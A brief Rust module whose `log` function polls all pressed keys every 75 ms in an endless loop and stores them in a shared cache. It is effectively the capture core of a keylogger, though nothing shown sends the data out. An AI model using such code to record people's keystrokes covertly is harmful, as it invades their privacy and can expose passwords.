use std::{thread, time};

use device_query::{DeviceQuery, DeviceState};

use crate::ram::PubInfo;

pub fn log() {
    // Todo Improve this
    loop {
        let keys = DeviceState::new().get_keys();
        for key_pressed in keys {
            PubInfo::get().key_pressed_cache.push(key_pressed.to_string());
        }
        thread::sleep(time::Duration::from_millis(75))
    }
}
